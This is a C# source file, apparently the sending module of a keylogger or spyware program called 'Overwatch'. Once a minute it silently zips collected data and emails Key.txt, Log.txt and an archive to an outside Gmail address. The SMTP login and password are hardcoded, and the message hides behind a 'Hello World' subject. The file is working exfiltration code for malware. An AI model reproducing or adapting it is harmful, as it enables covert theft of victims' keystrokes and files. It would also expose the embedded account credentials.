﻿using System;
using System.Net;
using System.Net.Mail;
using System.IO;

namespace Overwatch
{
    class cSendingInformation
    {
        static appLog Log = new appLog();
        public void Sending() 
        {
            try
            {
                while (true)
                {
                    cThread.sending = true;
                    System.Threading.Thread.Sleep(60000);
                    if (ConnectivityChecker.CheckInternet() == true)
                    {
                        using (MailMessage mail = new MailMessage())
                        {
                            mail.From = new MailAddress("isthechastener@gmail.com");
                            mail.To.Add("satiriorn@gmail.com");
                            mail.Subject = "Hello World";
                            mail.Body = "<h1>Hello</h1>";
                            mail.IsBodyHtml = true;
                            cReceiveInformation.CompressionFile();
                            mail.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Key.txt"));
                            mail.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Log.txt"));
                            mail.Attachments.Add(new Attachment(appConfing.targetDirPath +"\\result.zip"));

                            using (SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587))
                            {
                                smtp.Credentials = new NetworkCredential("isthechastener@gmail.com", "192020castle");
                                smtp.EnableSsl = true;
                                smtp.Send(mail);
                            }
                        }
                        cThread.sending = false;
                        cMain.Thread();
                    }
                }
            }
            catch (Exception ex) { Log.Write(ex.Message, true); cThread.sending = false; }
        }
    }
    public static class ConnectivityChecker
    {
        public delegate void Response();
        public static bool CheckInternet()
        {
            try
            {
                IPHostEntry entry = Dns.GetHostEntry("dns.msftncsi.com");
                if (entry.AddressList.Length == 0)
                    return false;
                else
                    if (!entry.AddressList[0].ToString().Equals("131.107.255.255"))
                        return true;
            }
            catch { return false;}

            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create("http://www.msftncsi.com/ncsi.txt");
            try
            {
                HttpWebResponse responce = (HttpWebResponse)request.GetResponse();

                if (responce.StatusCode != HttpStatusCode.OK)
                    return true;
                using (StreamReader sr = new StreamReader(responce.GetResponseStream()))
                {
                    return sr.ReadToEnd().Equals("Microsoft NCSI") ? true : true;
                }
            }
            catch{ return false;}
        }
    }
}
